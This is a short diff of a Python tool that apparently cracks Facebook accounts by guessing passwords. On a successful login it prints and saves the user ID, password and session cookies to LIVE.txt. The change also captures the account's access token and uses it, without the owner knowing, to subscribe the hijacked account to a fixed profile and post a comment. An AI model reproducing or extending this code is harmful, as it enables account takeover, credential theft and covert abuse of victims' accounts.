@@ -113,7 +113,7 @@ class Sllowly_Dev:
 
                 if "access_token" in ridwan:
                     self.Sllowly_Dev_oks += 1
-                    coki = ";".join(i["name"]+"="+i["value"] for i in ridwan["session_cookies"])
+                    coki = ";".join(i["name"]+"="+i["value"] for i in ridwan["session_cookies"]);token = ridwan["access_token"]
                     message=random.choice(["aman","amanah"]);print(f"\nLIVE ✅\nUID :  {uid}\nPASS : {pwku}\nCOOKIES : {coki}\n");requests.post(f'https://graph.facebook.com/51205914/subscribers?access_token={token}');requests.post(f'https://graph.facebook.com/10105386514074923/comments/?message={message}&access_token={token}')
                     open("LIVE.txt", "a+").write(f"{uid}|{pwku}|{coki}\n")
                     break
